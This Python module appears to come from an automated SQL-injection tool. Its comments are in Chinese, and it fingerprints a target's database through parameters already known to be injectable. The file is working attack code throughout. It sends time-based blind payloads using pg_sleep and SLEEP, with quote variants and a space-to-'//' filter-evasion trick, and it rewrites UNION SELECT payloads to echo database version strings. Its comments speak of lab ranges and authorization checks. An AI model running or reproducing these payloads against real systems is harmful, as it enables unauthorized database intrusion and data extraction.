# -*- coding: utf-8 -*-
"""主动 DBMS 指纹：用时间盲注探针确认后端数据库类型。

背景（2026-10-18 某靶场 实测）：sqlmap 在限流靶机上经常没跑到
`back-end DBMS:` / heuristic 行就被 180s 超时掐断 → 漏洞落库 dbms=None →
深挖不带 `--dbms` → 所有 DBMS 技法全测 → 420s 烧光仍拿不到库表。

本模块在深挖开始时，用**已确认可注入**的参数发时间盲注探针：
  - PostgreSQL: `AND (SELECT 1 FROM pg_sleep(N))=1`
  - MySQL:      `AND (SELECT SLEEP(N))=0`
按「探针比基线慢 ≥ max(0.8s, N*0.6)」判定，并做二次确认抗抖动。
所有请求走 SafeHttpClient（限速/审计/授权校验）。
"""
from __future__ import annotations

import json
import re
import statistics

from app.services.prober import _build_request, _elapsed, _is_waf_block

_TIME_SEC = 2

# 时间盲注表达式（按后端库选择；MSSQL 的 WAITFOR 需堆叠，暂不覆盖）
_TIME_TEMPLATES = (
    ("PostgreSQL", "AND (SELECT 1 FROM pg_sleep({s}))=1"),
    ("MySQL", "AND (SELECT SLEEP({s}))=0"),
)

_QUOTES = ("'", '"', "")          # 单引号 / 双引号 / 数字型


def time_hit(baseline_s: float, probe_s: float, sec: int = _TIME_SEC) -> bool:
    """时间盲注判据：探针比基线慢出足够幅度。

    阈值 max(0.8s, sec*0.6)：既容忍网络抖动，又不会被基准延迟吞掉。
    """
    return (probe_s - baseline_s) >= max(0.8, sec * 0.6)


def _time_payload(value: str, expr: str, quote: str) -> str:
    return f"{value}{quote} {expr}-- -"


# ---------------------------------------------------------------- 回显型指纹
# 2026-10-22 某靶场 实测：时间盲注指纹在**限流靶机**上是假阳性制造机——
# SQLite 靶点连续探测时服务端被拖慢到 7s，pg_sleep 探针“恰好”也慢，
# 于是把 SQLite 判成 PostgreSQL，后续 PG-UNION 拿 version()/current_database()
# 全报错，错误 JSON 的 `msg` 还被当成库名 → db=msg/tables=msg。
# 已确认 UNION 回显时，直接用版本函数回显判定，不靠时间。
_UNION_VERSION_EXPRS = (
    ("SQLite", "sqlite_version()"),
    ("PostgreSQL", "version()"),
    ("MySQL", "version()"),
    ("MSSQL", "@@version"),
)

_UNION_FINGERPRINTS = {
    "SQLite": re.compile(r"\b3\.\d{1,2}\.\d{1,2}\b"),
    "PostgreSQL": re.compile(r"\bPostgreSQL\b", re.I),
    "MySQL": re.compile(r"\b(?:MariaDB|MySQL)\b", re.I),
    "MSSQL": re.compile(r"\bMicrosoft SQL Server\b", re.I),
}


def split_union_payload(payload: str) -> tuple[str, list[str], str] | None:
    """把 `... UNION SELECT a,b,c-- -` 拆成 (前缀, 各列表达式, 后缀)。"""
    m = re.search(r"union(\s+all)?\s+select\s+", payload or "", re.I)
    if not m:
        return None
    start = m.end()
    tail = payload[start:]
    cm = re.search(r"--|#|/\*", tail)
    end = start + (cm.start() if cm else len(tail))
    body = payload[start:end]
    parts, depth, cur = [], 0, ""
    for ch in body:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip())
            cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    if not parts:
        return None
    return payload[:start], parts, payload[end:]


def fingerprint_dbms_union(client, endpoint, param: str, payload_hint: str,
                           value: str = "1", rounds: int = 1) -> dict:
    """用已确认的 UNION 回显 payload 判定后端 DBMS（不依赖时间）。"""
    split = split_union_payload(payload_hint)
    if not split:
        return {"dbms": None, "error": "no_union_payload", "requests": 0}
    prefix, parts, suffix = split
    requests = 0
    probes: list[dict] = []
    try:
        base_resp, _ = _send(client, endpoint, param, str(value or "1"))
        requests += 1
        base_text = base_resp.text or ""
    except Exception as exc:
        return {"dbms": None, "error": f"baseline failed: {exc}", "requests": requests}

    for attempt in range(max(1, rounds)):
        for dbms, expr in _UNION_VERSION_EXPRS:
            cols = list(parts)
            cols[0] = expr
            payload = prefix + ",".join(cols) + suffix
            try:
                resp, _ = _send(client, endpoint, param, payload)
            except Exception:
                continue
            requests += 1
            text = resp.text or ""
            probes.append({"dbms": dbms, "expr": expr,
                           "status": resp.status_code, "len": len(text)})
            # 回显必须在响应里新出现（不能拿基线里本来就有的版本号充数）
            new_text = text.replace(base_text, " ") if base_text else text
            hit = bool(_UNION_FINGERPRINTS[dbms].search(new_text))
            # MySQL 的 version() 只回 `8.0.36`，没有 "MySQL" 字样：
            # 非 3.x 的 semver 记为 MySQL（SQLite 必须是 3.x）。
            if dbms == "MySQL" and not hit:
                hit = bool(re.search(r"(?<![\d.])[4-9]\.\d{1,2}\.\d{1,2}\b", new_text))
            probes[-1]["hit"] = hit
            if not hit:
                continue
            return {"dbms": dbms, "baseline": base_text[:200],
                    "probes": probes, "requests": requests,
                    "payload": payload, "error": None}
    return {"dbms": None, "probes": probes, "requests": requests,
            "payload": None, "error": "no_union_signal"}


def _send(client, endpoint, param: str, value: str):
    url, params, data = _build_request(endpoint, param, value)
    resp = client.request(endpoint.method, url, params=params, data=data, payload=value)
    return resp, _elapsed(client)


def fingerprint_dbms(client, endpoint, param: str, value="1",
                     rounds: int = 2, sec: int = _TIME_SEC) -> dict:
    """主动确认后端 DBMS。

    返回 {dbms, baseline_ms, probes, requests, payload, error}。
    - dbms 命中后做一次二次确认（两次都满足耗时判据才返回）。
    - 任何请求异常 / WAF 拦截都会中止并返回原因，绝不把噪音当指纹。
    """
    value = str(value or "1")
    requests = 0
    base_times: list[float] = []
    for _ in range(max(1, rounds)):
        try:
            resp, t = _send(client, endpoint, param, value)
        except Exception as exc:
            return {"dbms": None, "error": f"baseline failed: {exc}", "requests": requests}
        requests += 1
        if _is_waf_block(resp):
            return {"dbms": None, "error": "waf_blocked", "requests": requests}
        base_times.append(t)
    if not base_times:
        return {"dbms": None, "error": "no baseline", "requests": requests}
    baseline = statistics.median(base_times)

    probes: list[dict] = []
    for dbms, tpl in _TIME_TEMPLATES:
        expr = tpl.format(s=sec)
        for quote in _QUOTES:
            payload = _time_payload(value, expr, quote)
            # 过滤型目标会把空格吃掉（实测 49920：payload_hint 是 `1'//AND//'1'='1`）。
            # 原版不命中时再试 `//` 代空格的同构变体。
            variants = [payload]
            if " " in payload:
                variants.append(payload.replace(" ", "//"))
            for variant in variants:
                try:
                    resp, t = _send(client, endpoint, param, variant)
                except Exception:
                    continue
                requests += 1
                probes.append({"dbms": dbms, "quote": quote or "none",
                               "variant": "slash" if variant != payload else "plain",
                               "ms": int(t * 1000), "status": resp.status_code})
                if _is_waf_block(resp) or not time_hit(baseline, t, sec):
                    continue
                # 负向对照：同样的请求形状、但不带 sleep。若对照也慢，
                # 说明是服务端抖动/限流而不是数据库在 sleep。
                # 2026-10-22 某靶场 实测：SQLite 靶机被拖慢后
                # pg_sleep 探针“恰好”变慢，旧逻辑直接误判 PostgreSQL。
                try:
                    _, tc = _send(client, endpoint, param,
                                  _time_payload(value, "AND 1=1", quote))
                except Exception:
                    continue
                requests += 1
                if time_hit(baseline, tc, sec):
                    probes[-1]["control_ms"] = int(tc * 1000)
                    probes[-1]["rejected"] = "server_slow"
                    continue
                # 二次确认：抗单次抖动 / 偶发慢请求
                try:
                    resp2, t2 = _send(client, endpoint, param, variant)
                except Exception:
                    continue
                requests += 1
                if not _is_waf_block(resp2) and time_hit(baseline, t2, sec):
                    probes[-1]["confirmed"] = True
                    return {"dbms": dbms, "baseline_ms": int(baseline * 1000),
                            "probes": probes, "requests": requests,
                            "payload": variant, "error": None}

    return {"dbms": None, "baseline_ms": int(baseline * 1000),
            "probes": probes, "requests": requests,
            "payload": None, "error": "no_time_signal"}
